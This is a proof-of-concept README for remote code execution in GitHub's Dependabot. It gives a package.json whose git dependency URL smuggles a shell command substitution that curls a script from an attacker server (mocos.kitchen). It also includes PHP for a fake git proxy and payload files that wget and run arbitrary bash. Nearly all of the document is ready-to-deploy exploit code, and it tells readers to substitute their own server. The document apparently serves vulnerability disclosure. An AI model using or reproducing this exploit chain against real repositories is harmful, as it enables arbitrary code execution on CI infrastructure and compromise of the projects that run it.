# PoC for dependabot RCE

Please replace `mocos.ktichen` to your own server.

After the preparation, you can see your dependabot result from `https://github.com/<USER>/<REPO>/network/updates`

## Prepare GitHub Repository

Add following files:

`package-lock.json`
```
{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "dependencies": {
    "tyage-sample-package": {
      "version": "4.0.0"
    }
  }
}
```

`package.json`
```
{
  "name": "javascript",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "private": true,
  "dependencies": {
    "tyage-sample-package": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
  }
}
```

`.github/dependabot.yml` (add this file after you prepared the servers!)
```
---
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: daily
```

## Prepare Servers

Following servers required.

1. Fake git repository

`https://github.com.mocos.kitchen/github.com/...` should run this PHP file:

```php
<?php
if (!empty($input)) {
  // proxy request to https://github.com/tyage/sample-package.git/git-upload-pack
  $url = "https://github.com/tyage/sample-package.git/git-upload-pack";
  $context = ["http" => [
    "method" => "POST",
    "header" => [ "Content-Type: application/x-git-upload-pack-request" ],
    "content" => $input
  ]];
  if (!empty($_SERVER['HTTP_GIT_PROTOCOL'])) {
    $context["http"]["header"][] = "Git-Protocol: version=2";
  }
  $result = file_get_contents($url, false, stream_context_create($context));

  header("content-type: application/x-git-upload-pack-result");
  echo $result;

} else {
  // proxy request to https://github.com/tyage/sample-package.git/info/refs?service=git-upload-pack
  $context = ["http" => [ "header" => [] ]];
  if (!empty($_SERVER['HTTP_GIT_PROTOCOL'])) {
    $context["http"]["header"][] = "Git-Protocol: version=2";
  }
  $url = "https://github.com/tyage/sample-package.git/info/refs?service=git-upload-pack";
  $result = file_get_contents($url, false, stream_context_create($context));

  header("content-type: application/x-git-upload-pack-advertisement");
  echo $result;
}
```

2. Payload server

`http://mocos.kitchen:3000/bash.txt` return this:

```bash
eval `wget mocos.kitchen:3000/payload.txt; bash payload.txt`
```

`http://mocos.kitchen:3000/payload.txt` return this:

```bash
# you can run arbitrary OS command here
echo hello world
```
